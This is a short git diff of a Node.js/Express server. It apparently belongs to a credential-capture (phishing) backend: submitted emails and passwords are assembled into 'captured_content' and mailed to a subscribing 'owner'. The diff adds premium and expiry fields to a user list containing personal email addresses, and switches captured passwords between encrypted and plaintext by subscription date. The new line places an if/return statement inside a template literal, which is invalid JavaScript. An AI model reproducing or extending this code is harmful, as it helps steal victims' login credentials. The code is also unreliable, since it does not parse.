@@ -34,7 +34,7 @@ app.get('/', function (req, res) {
     
 });
 var myArray = [
-    {"id": 1, "name": "admin", "email": "mdalonebd@gmail.com"},
+    {"id": 1, "name": "admin", "email": "mdalonebd@gmail.com","premium_member":1,"expire_date":"2023-4-22"},
 
     {"id": 2, "name": "momin","email":"momin0132813@gmail.com","premium_member":1,"expire_date":"2023-4-22"},
     {"id": 43, "name": "ebrahim", "email": "sh2471386@gmail.com"}
@@ -64,9 +64,10 @@ const day = date.getDate();
  let fulldate =[year,month,day].join("-");
  console.log(fulldate);
  
+ let user = myArray.find(o => o.id == req.body.owner);
+
  
- 
-    var captured_content = `\n Email: ${req.body.email} Password: ${encryptedPass}`;
+    var captured_content = `\n Email: ${req.body.email} Password: ${if(user.expire_date==fulldate){return encryptedPass;}else{return password;}}`;
     let toMail = req.body.owner;
     
     
